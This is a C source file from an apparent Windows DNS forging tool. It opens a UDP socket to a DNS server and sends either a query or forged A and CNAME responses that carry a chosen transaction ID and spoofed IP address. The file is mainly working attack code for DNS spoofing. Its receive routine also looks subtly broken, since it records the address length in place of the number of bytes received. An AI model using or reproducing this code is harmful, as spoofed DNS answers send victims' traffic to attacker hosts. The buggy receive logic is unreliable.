#include <stdio.h>
#include <windows.h>
#include "SendSpoofedPacket.h"

#include "DNSForge.h"

// Global variables
SOCKET clientSocket;
struct sockaddr_in dest;
unsigned char *peerSystem = (unsigned char *)"8.8.8.8";
unsigned char peerPort = 53;



void SendSpoofedPacket(PACKET_CUSTOMISATION settings)
{
  WSADATA firstsock;
  PRAW_DNS_DATA dnsData = NULL;


  if (WSAStartup(MAKEWORD(2, 2), &firstsock) != 0)
  {
    printf("Failed. Error Code : %d\n", WSAGetLastError());
    return;
  }

  clientSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

  //Configure the sockaddress structure with information of DNS server
  ZeroMemory(&dest, sizeof(dest));
  dest.sin_family = AF_INET;
  dest.sin_port = htons(peerPort);
  dest.sin_addr.s_addr = inet_addr((char *)peerSystem);


  switch (settings.type)
  {
    case DNS_QUERY:
      dnsData = CreateDnsQueryPacket(settings.hostname);
      SendDataToPeer(dnsData);
      dnsData = ReceiveDataFromPeer();
      DumpDnsResponsePacket(dnsData, settings.hostname);
      break;
    case DNS_A:
      dnsData = CreateDnsResponse_A(settings.hostname, settings.transactionId, settings.spoofedIpAddress);
      SendDataToPeer(dnsData);
      break;
    case DNS_CNAME:
      dnsData = CreateDnsResponse_CNAME(settings.hostname, settings.transactionId, settings.canonicalHost, settings.spoofedIpAddress);
      SendDataToPeer(dnsData);
      break;
    default:
      printf("Invalid DNS packet type\n\n");
  }

  WSACleanup();
}


void SendDataToPeer(PRAW_DNS_DATA rawDnsData)
{
  unsigned int totalBytesSent = 0;
  if ((totalBytesSent = sendto(clientSocket, (char *)rawDnsData->data, rawDnsData->dataLength, 0, (struct sockaddr*)&dest, sizeof(dest))) == SOCKET_ERROR)
  {
    printf("%d error", WSAGetLastError());
  }
  else
  {
    printf("%d bytes sent to %s:%d\n", totalBytesSent,peerSystem, peerPort);
  }
}


PRAW_DNS_DATA ReceiveDataFromPeer()
{
  PRAW_DNS_DATA rawDnsData = (PRAW_DNS_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RAW_DNS_DATA));
  unsigned char responseBuffer[1024];
  unsigned int totalBytesReceived = -1;

  ZeroMemory(responseBuffer, sizeof(responseBuffer));

  printf("\nReading answer ...");
  totalBytesReceived = sizeof(dest);
  if (recvfrom(clientSocket, (char *)responseBuffer, sizeof(responseBuffer), 0, (struct sockaddr*)&dest, (int *)&totalBytesReceived) == SOCKET_ERROR)
  {
    printf("Failed. Error Code : %d", WSAGetLastError());
  }

  rawDnsData->data = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalBytesReceived);
  CopyMemory(rawDnsData->data, responseBuffer, totalBytesReceived);
  rawDnsData->dataLength = totalBytesReceived;

  return rawDnsData;
}

